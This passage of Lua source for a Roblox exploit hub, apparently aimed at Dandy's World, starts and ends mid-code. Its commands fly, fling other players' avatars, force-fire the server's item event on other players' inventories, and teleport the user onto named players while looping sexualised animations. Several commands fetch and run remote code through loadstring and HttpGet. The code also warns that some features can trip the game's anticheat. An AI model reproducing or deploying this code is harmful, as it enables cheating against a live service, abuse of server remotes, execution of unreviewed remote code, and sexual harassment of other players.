	game:GetService"Players"		
	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
	local merchframe = mainGui:WaitForChild"MerchFrame"
	merchframe.Visible = true
end)

addcommand("openoldskinunlocker", "oosu", function()
	game:GetService"Players"		
	local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"
	local skincollectionframe = mainGui:WaitForChild"SkinCollectionFrame"
	skincollectionframe.Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

local teleportConnections = {}
local currentAnimationTracks = {}

function playAnimation(character, animationId, connectionKey)
	local Anim = Instance.new"Animation"		
	Anim.AnimationId = "rbxassetid://" .. animationId

	local humanoid = character:FindFirstChild"Humanoid"		
	if humanoid then
		currentAnimationTracks[connectionKey] = humanoid:LoadAnimation(Anim)
		currentAnimationTracks[connectionKey]:Play()
		currentAnimationTracks[connectionKey]:AdjustWeight(999)
		currentAnimationTracks[connectionKey].Looped = true
	end
end

function isAnimationPlaying(character, animationId)
	local humanoid = character:FindFirstChild"Humanoid"		
	if humanoid then
		for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
			if track.Animation.AnimationId == "rbxassetid://" .. animationId then
				return true
			end
		end
	end
	return false
end

function teleportBehindTarget(player, targetPlayer, baseOffset, connectionKey)
	local character = player.Character
	local targetCharacter = targetPlayer.Character
	if character and targetCharacter then
		local targetRoot = targetCharacter:FindFirstChild"HumanoidRootPart"			
		local playerRoot = character:FindFirstChild"HumanoidRootPart"			
		if targetRoot and playerRoot then
			local offset = baseOffset

			-- Apply randomized Y offset only for "hsit" and "hjump"
			if (connectionKey == "hsit" or connectionKey == "hjump") and isAnimationPlaying(targetCharacter, "16873659196") then
				local yOffset = 3.7 -- Y-axis offset
				offset = CFrame.new(baseOffset.X, yOffset, baseOffset.Z)
			end

			playerRoot.CFrame = targetRoot.CFrame * offset
		end
	end
end

function findPlayerByPartialName(partialName)
	for _, player in ipairs(game.Players:GetPlayers()) do
		if player.Name:lower():sub(1, #partialName) == partialName:lower() then
			return player
		end
	end
	return nil
end

function handleTeleportCommand(command, player, animationId, offset, connectionKey)
	local targetName = command:match("^" .. connectionKey .. "%s+(%S+)$")
	local targetPlayer

	if targetName then
		if targetName:lower() == "random" then
			local players = game.Players:GetPlayers()
			if #players > 0 then
				targetPlayer = players[math.random(1, #players)]
			end
		else
			targetPlayer = findPlayerByPartialName(targetName)
		end
	end

	if targetPlayer then
		game.Workspace.Gravity = 0
		playAnimation(player.Character, animationId, connectionKey)

		if teleportConnections[connectionKey] then
			teleportConnections[connectionKey]:Disconnect()
		end
		teleportConnections[connectionKey] = noxious["run service"].Heartbeat:Connect(function()
			if not targetPlayer.Character or not player.Character then
				teleportConnections[connectionKey]:Disconnect()
				teleportConnections[connectionKey] = nil
				return
			end
			teleportBehindTarget(player, targetPlayer, offset, connectionKey)
		end)
	end
end

function handleStopCommand(connectionKey)
	game.Workspace.Gravity = 196.2
	if teleportConnections[connectionKey] then
		teleportConnections[connectionKey]:Disconnect()
		teleportConnections[connectionKey] = nil
	end

	if currentAnimationTracks[connectionKey] then
		currentAnimationTracks[connectionKey]:Stop()
		currentAnimationTracks[connectionKey] = nil
	end

	local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local humanoid = character:WaitForChild"Humanoid"

	local animate = character:FindFirstChild"Animate"		
	if animate then
		animate.Disabled = true
		for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
			track:Stop()
		end
		animate.Disabled = false
	end
end

function dwbang(command, player)
	handleTeleportCommand(command, player, "18213671382", CFrame.new(0, 0, 0.8), "bang")
end

function dwunbang()
	handleStopCommand"bang"	
end

function dwhead(command, player)
	handleTeleportCommand(command, player, "17098030743", CFrame.new(0, -0.35, -1.75) * CFrame.Angles(0, math.pi, 0), "head")
end

function dwunhead()
	handleStopCommand"head"	
end

function dwhsit(command, player)
	handleTeleportCommand(command, player, "16873659196", CFrame.new(0, 4.65, -0.3), "hsit")
end

function dwunhsit()
	handleStopCommand"hsit"	
end

function dwhsit2(command, player)
	handleTeleportCommand(command, player, "75597599641198", CFrame.new(0, 3.25, -0.8), "hsit2")
end

function dwunhsit2()
	handleStopCommand"hsit2"	
end

function dwhjump(command, player)
	handleTeleportCommand(command, player, "16909854575", CFrame.new(0, 4.65, -0.3), "hjump")
end

function dwunhjsit()
	handleStopCommand"hjump"	
end

function bottombang(command, player)
	handleTeleportCommand(command, player, "91029796934547", CFrame.new(0, -0.2, -0.9), "bbang")
end

function unbottombang()
	handleStopCommand"bbang"	
end

-- BANG
addcommand("bang", "", function(target)
	dwbang("bang " .. (target or ""), noxious["players"].LocalPlayer)
end)
addcommand("unbang", "", dwunbang)

-- HEAD
addcommand("head", "", function(target)
	dwhead("head " .. (target or ""), noxious["players"].LocalPlayer)
end)
addcommand("unhead", "", dwunhead)

-- HSIT
addcommand("hsit", "", function(target)
	dwhsit("hsit " .. (target or ""), noxious["players"].LocalPlayer)
end)
addcommand("unhsit", "", dwunhsit)

-- HSIT2
addcommand("hsit2", "", function(target)
	dwhsit2("hsit2 " .. (target or ""), noxious["players"].LocalPlayer)
end)
addcommand("unhsit2", "", dwunhsit2)

-- HJUMP
addcommand("hjump", "", function(target)
	dwhjump("hjump " .. (target or ""), noxious["players"].LocalPlayer)
end)
addcommand("unhjump", "", dwunhjsit)

-- BBANG
addcommand("bbang", "", function(target)
	bottombang("bbang " .. (target or ""), noxious["players"].LocalPlayer)
end)
addcommand("unbbang", "", unbottombang)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("fliptools", "ft", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Miscellaneous/Flip%20Tools"))()
end)

-------------------------------------------------------------------------------------------------------------------------------

local flying = false
local speed = 20
local flightConnection

-- Function to start flying
addcommand("fly", "fly", function(flySpeed)
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild"Humanoid"		
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"		

	if flying then return end -- Prevent multiple starts
	flying = true
	humanoidRootPart.Anchored = false
	speed = flySpeed or 20 -- Set the speed to the provided value or default to 20

	-- Start flight loop
	flightConnection = noxious["run service"].RenderStepped:Connect(function()
		if flying then
			local moveDirection = humanoid.MoveDirection
			if moveDirection.Magnitude > 0 then
				local cameraDirection = workspace.CurrentCamera.CFrame.LookVector

				if humanoidRootPart.Anchored then
					humanoidRootPart.Anchored = false
				end

				-- Combine movement with camera Y direction for flight control
				local combinedDirection = (moveDirection * Vector3.new(1, 0, 1)) + Vector3.new(0, cameraDirection.Y, 0)
				combinedDirection = combinedDirection.Unit
				local lookAt = humanoidRootPart.Position + Vector3.new(cameraDirection.X, 0, cameraDirection.Z)
				humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position, lookAt)
				humanoidRootPart.Velocity = combinedDirection * speed
			else
				humanoidRootPart.Anchored = true -- Hover in place if no movement
				humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
			end
		end
	end)
end)

addcommand("unfly", "unfly", function()
	if not flying then return end -- Prevent stopping if already stopped

	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild"HumanoidRootPart"

	flying = false
	humanoidRootPart.Anchored = false
	humanoidRootPart.Velocity = Vector3.new(0, 0, 0)

	-- Disconnect flight loop
	if flightConnection then
		flightConnection:Disconnect()
		flightConnection = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("spin", "spin", function(speed)
	local character = game.Players.LocalPlayer.Character
	if character then
		-- Remove any previous spinning effect (destroy BodyAngularVelocity)
		for _, v in pairs(character:WaitForChild"HumanoidRootPart":GetChildren()) do
			if v.Name == "Spinning" then
				v:Destroy()
			end
		end

		-- Create and apply BodyAngularVelocity for spinning
		local spin = Instance.new"BodyAngularVelocity"			
		spin.Name = "Spinning"
		spin.Parent = character:WaitForChild"HumanoidRootPart"			
		spin.MaxTorque = Vector3.new(0, math.huge, 0)  -- Allow rotation only on Y-axis
		spin.AngularVelocity = Vector3.new(0, speed, 0) -- Spin around the Y-axis
	end
end)

-- Function to stop spinning
addcommand("unspin", "unspin", function()
	local character = game.Players.LocalPlayer.Character
	if character then
		-- Remove the spinning effect (BodyAngularVelocity)
		for _, v in pairs(character:WaitForChild"HumanoidRootPart":GetChildren()) do
			if v.Name == "Spinning" then
				v:Destroy()
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("enablejumping", "ejump", function()
	spawn(function()
		local touchGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"TouchGui"		
		local touchControlFrame = touchGui:FindFirstChild"TouchControlFrame"		
		local jumpButton = touchControlFrame and touchControlFrame:FindFirstChild"JumpButton"

		local touchGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"TouchGui"
		touchGui:WaitForChild"TouchControlFrame"

		local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"			
		local menu = mainGui:WaitForChild"Menu"			
		local inviteButton = menu:WaitForChild"InviteButton"			
		local infoButton = menu:WaitForChild"InfoButton"			
		local settingsButton = menu:WaitForChild"SettingsButton"

		jumpButton.Visible = true
		inviteButton.Visible = false
		infoButton.Visible = false
		settingsButton.Visible = false
	end)

	spawn(function()
		local humanoid = character:WaitForChild"Humanoid"		
		humanoid.JumpPower = 50.145
		humanoid.JumpHeight = 7.2

		noxious["local player"].CharacterAdded:Connect(function(newCharacter)
			local newHumanoid = newCharacter:WaitForChild"Humanoid"			
			newHumanoid.JumpPower = 50.145
			newHumanoid.JumpHeight = 7.2
		end)
	end)

	notify("Spam jumping can trigger anticheat.", 5, "warning")
end)

addcommand("disablejumping", "djump", function()
	spawn(function()
		local touchGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"TouchGui"		
		local touchControlFrame = touchGui:FindFirstChild"TouchControlFrame"		
		local jumpButton = touchControlFrame and touchControlFrame:FindFirstChild"JumpButton"

		local touchGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"TouchGui"
		touchGui:WaitForChild"TouchControlFrame"
		local mainGui = noxious["local player"]:WaitForChild"PlayerGui":WaitForChild"MainGui"			
		local menu = mainGui:WaitForChild"Menu"			
		local inviteButton = menu:WaitForChild"InviteButton"			
		local infoButton = menu:WaitForChild"InfoButton"			
		local settingsButton = menu:WaitForChild"SettingsButton"

		jumpButton.Visible = false
		inviteButton.Visible = true
		infoButton.Visible = true
		settingsButton.Visible = true
	end)

	spawn(function()
		local humanoid = character:WaitForChild"Humanoid"		
		humanoid.JumpPower = 0
		humanoid.JumpHeight = 0

		noxious["local player"].CharacterAdded:Connect(function(newCharacter)
			local newHumanoid = newCharacter:WaitForChild"Humanoid"			
			newHumanoid.JumpPower = 0
			newHumanoid.JumpHeight = 0
		end)
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

-- Function to force use items for a specific target
addcommand("forceuseitems", "fui", function(target)
	local players = noxious["players"]
	local replicatedStorage = game:GetService("ReplicatedStorage")
	local itemEvent = replicatedStorage:FindFirstChild("Events") and replicatedStorage.Events:FindFirstChild("ItemEvent")

	-- Ensure the ItemEvent exists
	if not itemEvent then
		return
	end

	-- Helper function to invoke the item event for a specific slot
	local function invokeItem(targetPlayer, slot)
		if not targetPlayer or not targetPlayer.Character then
			return
		end

		local character = targetPlayer.Character
		local inventory = character:FindFirstChild("Inventory")
		local item = inventory and inventory:FindFirstChild(slot)

		if item then
			local args = {
				[1] = character,
				[2] = item
			}
			itemEvent:InvokeServer(unpack(args))
		end
	end

	-- Resolve the target
	local playersList = {}
	if target == "me" then
		table.insert(playersList, players.LocalPlayer)
	elseif target == "others" then
		for _, player in ipairs(players:GetPlayers()) do
			if player ~= players.LocalPlayer then
				table.insert(playersList, player)
			end
		end
	elseif target == "all" then
		playersList = players:GetPlayers() or {}
	else
		-- Find player by partial name
		for _, player in ipairs(players:GetPlayers()) do
			if player.Name:lower():find(target:lower(), 1, true) then
				table.insert(playersList, player)
				break
			end
		end
	end

	-- Validate if playersList is not empty
	if #playersList == 0 then
		return
	end

	-- Loop through each resolved target and invoke the item event for each slot
	for _, targetPlayer in ipairs(playersList) do
		for _, slot in ipairs({ "Slot1", "Slot2", "Slot3" }) do
			invokeItem(targetPlayer, slot)
		end
	end
end)

-- Table to keep track of running loops for each target
local loopForceUseItemsTasks = {}

-- Helper function to resolve targets
function resolveTargets(target)
	local players = noxious["players"]
	local targets = {}

	if target == "me" then
		table.insert(targets, players.LocalPlayer)
	elseif target == "others" then
		for _, player in ipairs(players:GetPlayers()) do
			if player ~= players.LocalPlayer then
				table.insert(targets, player)
			end
		end
	elseif target == "all" then
		targets = players:GetPlayers()
	else
		-- Find player by partial name
		for _, player in ipairs(players:GetPlayers()) do
			if player.Name:lower():find(target:lower(), 1, true) then
				table.insert(targets, player)
				break
			end
		end
	end

	return targets
end

-- Function to enable looping force use of items
addcommand("enableloopforceuseitems", "elfui", function(target, delay)
	local _=noxious["players"]

	-- Function to force use items for a specific target
	local function forceUseItems(target)
		local players = noxious["players"]
		local replicatedStorage = game:GetService("ReplicatedStorage")
		local itemEvent = replicatedStorage:FindFirstChild("Events") and replicatedStorage.Events:FindFirstChild("ItemEvent")

		-- Ensure the ItemEvent exists
		if not itemEvent then
			return
		end

		-- Helper function to invoke the item event for a specific slot
		local function invokeItem(targetPlayer, slot)
			if not targetPlayer or not targetPlayer.Character then
				return
			end

			local character = targetPlayer.Character
			local inventory = character:FindFirstChild("Inventory")
			local item = inventory and inventory:FindFirstChild(slot)

			if item then
				local args = {
					[1] = character,
					[2] = item
				}
				itemEvent:InvokeServer(unpack(args))
			end
		end

		-- Resolve the target
		local playersList = {}
		if target == "me" then
			table.insert(playersList, players.LocalPlayer)
		elseif target == "others" then
			for _, player in ipairs(players:GetPlayers()) do
				if player ~= players.LocalPlayer then
					table.insert(playersList, player)
				end
			end
		elseif target == "all" then
			playersList = players:GetPlayers() or {}
		else
			-- Find player by partial name
			for _, player in ipairs(players:GetPlayers()) do
				if player.Name:lower():find(target:lower(), 1, true) then
					table.insert(playersList, player)
					break
				end
			end
		end

		-- Validate if playersList is not empty
		if #playersList == 0 then
			return
		end

		-- Loop through each resolved target and invoke the item event for each slot
		for _, targetPlayer in ipairs(playersList) do
			for _, slot in ipairs({ "Slot1", "Slot2", "Slot3" }) do
				invokeItem(targetPlayer, slot)
			end
		end
	end

	-- Helper function to handle the looping logic
	local function loopForceUse(targetPlayer)
		while loopForceUseItemsTasks[targetPlayer] do
			forceUseItems(targetPlayer.Name) -- Use targetPlayer.Name to pass as string
			wait(delay) -- Use the specified delay between iterations
		end
	end

	-- Resolve the targets
	local targets = resolveTargets(target)

	-- Validate resolved targets
	if #targets == 0 then
		return
	end

	-- Start the loop for each resolved target
	for _, targetPlayer in ipairs(targets) do
		if not loopForceUseItemsTasks[targetPlayer] then
			loopForceUseItemsTasks[targetPlayer] = true
			spawn(function()
				loopForceUse(targetPlayer)
			end)
		end
	end
end)

-- Function to disable looping force use of items
addcommand("disableloopforceuseitems", "dlfui", function(target)
	local _=noxious["players"]

	-- Resolve the targets
	local targets = resolveTargets(target)

	-- Validate resolved targets
	if #targets == 0 then
		return
	end

	-- Stop the loop for each resolved target
	for _, targetPlayer in ipairs(targets) do
		loopForceUseItemsTasks[targetPlayer] = nil
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

-- Function to perform the fling action
addcommand("fling", "fling", function(user)
	local Players = noxious["players"]
	local Player = Players.LocalPlayer
	local Targets = {user} -- target

	local AllBool = false

	local GetPlayer = function(Name)
		Name = Name:lower()
		if Name == "all" or Name == "others" then
			AllBool = true
			return
		elseif Name == "random" then
			local GetPlayers = Players:GetPlayers()
			if table.find(GetPlayers, Player) then table.remove(GetPlayers, table.find(GetPlayers, Player)) end
			return GetPlayers[math.random(#GetPlayers)]
		elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
			for _, x in next, Players:GetPlayers() do
				if x ~= Player then
					if x.Name:lower():match("^" .. Name) then
						return x
					elseif x.DisplayName:lower():match("^" .. Name) then
						return x
					end
				end
			end
		else
			return
		end
	end





	local SkidFling = function(TargetPlayer)
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart

		local TCharacter = TargetPlayer.Character
		local THumanoid
		local TRootPart
		local THead
		local Accessory
		local Handle

		if TCharacter:FindFirstChildOfClass("Humanoid") then
			THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
		end
		if THumanoid and THumanoid.RootPart then
			TRootPart = THumanoid.RootPart
		end
		if TCharacter:FindFirstChild("Head") then
			THead = TCharacter.Head
		end
		if TCharacter:FindFirstChildOfClass("Accessory") then
			Accessory = TCharacter:FindFirstChildOfClass("Accessory")
		end
		if Accessory and Accessory:FindFirstChild("Handle") then
			Handle = Accessory.Handle
		end

		if Character and Humanoid and RootPart then
			if RootPart.Velocity.Magnitude < 50 then
				getgenv().OldPos = RootPart.CFrame
			end
			if THumanoid and THumanoid.Sit and not AllBool then
			end
			if THead then
				workspace.CurrentCamera.CameraSubject = THead
			elseif not THead and Handle then
				workspace.CurrentCamera.CameraSubject = Handle
			elseif THumanoid and TRootPart then
				workspace.CurrentCamera.CameraSubject = THumanoid
			end
			if not TCharacter:FindFirstChildWhichIsA("BasePart") then
				return
			end

			local FPos = function(BasePart, Pos, Ang)
				RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
				Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
				RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
				RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
			end

			local SFBasePart = function(BasePart)
				local TimeToWait = 2
				local Time = tick()
				local Angle = 0

				repeat
					if RootPart and THumanoid then
						if BasePart.Velocity.Magnitude < 50 then
							Angle = Angle + 100

							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()
						else
							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
							task.wait()

							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							task.wait()
						end
					else
						break
					end
				until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
			end

			workspace.FallenPartsDestroyHeight = 0 / 0

			local BV = Instance.new("BodyVelocity")
			BV.Name = "EpixVel"
			BV.Parent = RootPart
			BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
			BV.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)

			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

			if TRootPart then
				SFBasePart(TRootPart)
			elseif THead then
				SFBasePart(THead)
			elseif Accessory and Handle then
				SFBasePart(Handle)
			end

			BV:Destroy()
			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			workspace.CurrentCamera.CameraSubject = Humanoid

			repeat
				RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
				Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
				Humanoid:ChangeState("GettingUp")
				table.foreach(Character:GetChildren(), function(_, x)
					if x:IsA("BasePart") then
						x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
					end
				end)
				task.wait()
			until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
			workspace.FallenPartsDestroyHeight = getgenv().FPDH
		end
	end

	getgenv().Welcome = true
	if Targets[1] then
		for _, x in next, Targets do
			GetPlayer(x)
		end
	else
		return
	end

	if AllBool then
		for _, x in next, Players:GetPlayers() do
			SkidFling(x)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local walkflinging = false

function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end

addcommand("enablewalkfling", "ewf", function()
	local humanoid = noxious["local player"].Character:FindFirstChildWhichIsA("Humanoid")
	if humanoid then
		humanoid.Died:Connect(function()
			execcmd("disablewalkfling")
		end)
	end

	local walkflinging = true
	repeat noxious["run service"].Heartbeat:Wait()
		local character = noxious["local player"].Character
		local root = getRoot(character)
		local vel, movel = nil, 0.1

		while not (character and character.Parent and root and root.Parent) do
			noxious["run service"].Heartbeat:Wait()
			character = noxious["local player"].Character
			root = getRoot(character)
		end

		vel = root.Velocity
		root.Velocity = vel * 1000000 + Vector3.new(0, 1000000, 0)

		noxious["run service"].RenderStepped:Wait()
		if character and character.Parent and root and root.Parent then
			root.Velocity = vel
		end

		noxious["run service"].Stepped:Wait()
		if character and character.Parent and root and root.Parent then
			root.Velocity = vel + Vector3.new(0, movel, 0)
			movel = movel * -1
		end
	until walkflinging == false
end)

addcommand("disablewalkfling", "dwf", function()
	walkflinging = false
end)

-------------------------------------------------------------------------------------------------------------------------------

local callCount = 0

addcommand("singthickofit", "stoi", function()

	callCount += 1

	if callCount == 2 then
		callCount = 0
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Miscellaneous/Sing%20Thick%20of%20It"))()
	else
		notify("Type command again to confirm.", 5)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("becomecharacter", "bchar", function()
	local Players = game:GetService"Players"		
	local ReplicatedStorage = game:GetService"ReplicatedStorage"		
	local speaker = Players.LocalPlayer

	local args = {
		[1] = false
	}
	ReplicatedStorage.Events.UpdateSpawnedIn:FireServer(unpack(args))

	local character = speaker.Character
	local savedCFrame

	if character then
		local rootPart = character:FindFirstChild"HumanoidRootPart"			
		if rootPart then
			savedCFrame = rootPart.CFrame
		end
	end

	if character then
		local humanoid = character:FindFirstChildWhichIsA"Humanoid"			
		if humanoid then
			humanoid.Health = 0
		end
	end

	speaker.CharacterAdded:Wait()
	local newCharacter = speaker.Character

	if not newCharacter then return end

	local function setupHumanoid()
		local Cam = workspace.CurrentCamera
		local Pos = Cam.CFrame
		local Char = newCharacter
		local Human = Char:FindFirstChildWhichIsA"Humanoid"

		if not Human then return end

		local nHuman = Human:Clone()
		nHuman.Parent = Char
		speaker.Character = nil

		nHuman.BreakJointsOnDeath = true
		nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None

		Human:Destroy()
		speaker.Character = Char
		Cam.CameraSubject = nHuman
		Cam.CFrame = Pos

		local rootPart = Char:FindFirstChild"HumanoidRootPart"			
		if rootPart and savedCFrame then
			rootPart.CFrame = savedCFrame
		end

		local animateScript = Char:FindFirstChild"Animate"			
		if animateScript then
			animateScript.Disabled = true
			wait()
			animateScript.Disabled = false
		end

		nHuman.Health = nHuman.MaxHealth
	end

	newCharacter:WaitForChild("Humanoid", 5)
	setupHumanoid()

	wait(0)

	local Cam = workspace.CurrentCamera
	local Pos, Char = Cam.CFrame, speaker.Character
	local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
	local nHuman = Human.Clone(Human)
	nHuman.Parent, speaker.Character = Char, nil
	nHuman.SetStateEnabled(nHuman, 15, false)
	nHuman.SetStateEnabled(nHuman, 1, false)
	nHuman.SetStateEnabled(nHuman, 0, false)
	nHuman.BreakJointsOnDeath, Human = true, Human.Destroy(Human)
	speaker.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, wait() and Pos
	nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
	local Script = Char.FindFirstChild(Char, "Animate")
	if Script then
		Script.Disabled = true
		wait()
		Script.Disabled = false
	end
	nHuman.Health = nHuman.MaxHealth

	wait(1)

	savedCFrame = nil
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("animationsgui", "agui", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Dandy's%20World/Animations%20GUI"))()
end)

addcommand("glistensanimationcloset", "gac", function()
	loadstring(game:HttpGet"https://raw.githubusercontent.com/RodeStriker/TheDandyHelper/refs/heads/main/GAC")() 
end)

-------------------------------------------------------------------------------------------------------------------------------

local Players = noxious["players"]
local player = Players.LocalPlayer
local humanoid
local animationTracks = {}
local loopStates = {}
local config
local character

-- Function to load animations from character
local function setupAnimations(char)
	character = char
	animationTracks = {}
	loopStates = {}
	humanoid = character:WaitForChild("Humanoid")

	if game.PlaceId ~= noxious["test game"] then
		-- Wait for "Animations" folder
		while true do
			config = character:FindFirstChild("Animations")
			if config then
				for _, anim in ipairs(config:GetChildren()) do
					if anim:IsA("Animation") then
						local track = humanoid:LoadAnimation(anim)
						animationTracks[anim.Name] = track
						loopStates[anim.Name] = false
					end
				end
				break
			end
			task.wait(0.25)
		end
	end
end

-- Function to detect character in either location
local function monitorCharacter()
	while true do
		local inGameFolder = workspace:FindFirstChild("InGamePlayers")
		if inGameFolder then
			local inGameChar = inGameFolder:FindFirstChild(player.Name)
			if inGameChar then
				setupAnimations(inGameChar)
				break
			end
		end

		if player.Character then
			setupAnimations(player.Character)
			break
		end

		task.wait(0.5)
	end
end

-- Initial monitoring
task.spawn(monitorCharacter)

-- Listen for respawn
player.CharacterAdded:Connect(function(char)
	task.spawn(function()
		-- Optional small delay to ensure it's fully loaded
		task.wait(0.1)
		monitorCharacter()
	end)
end)

-- Animation control functions (unchanged)
function enableAnimationLoop(animName)
	local track = animationTracks[animName]
	if track and not loopStates[animName] then
		track.Looped = true
		track:Play()
		loopStates[animName] = true
	end
end

function disableAnimationLoop(animName)
	local track = animationTracks[animName]
	if track and loopStates[animName] then
		track.Looped = false
		track:Stop()
		loopStates[animName] = false
	end
end

function disableAllAnimationLoops()
	for animName, track in pairs(animationTracks) do
		if loopStates[animName] then
			track.Looped = false
			track:Stop()
			loopStates[animName] = false
		end
	end
end

-- Specific animation control functions (unchanged)
addcommand("enableloopextractinganimation", "elea", function()
	enableAnimationLoop("Decode")
end)

addcommand("disableloopextractinganimation", "dlea", function()
	disableAnimationLoop("Decode")
end)

addcommand("enableloopabilityanimation", "elaa", function()
	enableAnimationLoop("Ability")
end)

addcommand("disableloopabilityanimation", "dlaa", function()
	disableAnimationLoop("Ability")
end)

addcommand("enableloopidleanimation", "elia", function()
	enableAnimationLoop("Idle")
end)

addcommand("disableloopidleanimation", "dlia", function()
	disableAnimationLoop("Idle")
end)

addcommand("enableloopquirkanimation", "elqa", function()
	enableAnimationLoop("Quirk")
end)

addcommand("disableloopquirkanimation", "dlqa", function()
	disableAnimationLoop("Quirk")
end)

addcommand("enablelooprunningnanimation", "elra", function()
	enableAnimationLoop("Run")
end)

addcommand("disablelooprunningnanimation", "dlra", function()
	disableAnimationLoop("Run")
end)

addcommand("enableloopwalkinganimation", "elwa", function()
	enableAnimationLoop("Walk")
end)

addcommand("disableloopwalkinganimation", "dlwa", function()
	disableAnimationLoop("Walk")
end)

-------------------------------------------------------------------------------------------------------------------------------

local istposeloopenabled = false
local tposeloopconnection

function pauseAnimations()
	local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()
	local humanoid = character:WaitForChild"Humanoid"		
	local animator = humanoid:WaitForChild"Animator"		
	for _, track in pairs(animator:GetPlayingAnimationTracks()) do
		track:Stop()
	end
end

addcommand("tpose", "tpose", function()
	if istposeloopenabled then return end
	istposeloopenabled = true

	tposeloopconnection = noxious["run service"].Heartbeat:Connect(function()
		if istposeloopenabled then
			pauseAnimations()
		end
	end)
end)

addcommand("untpose", "untpose", function()
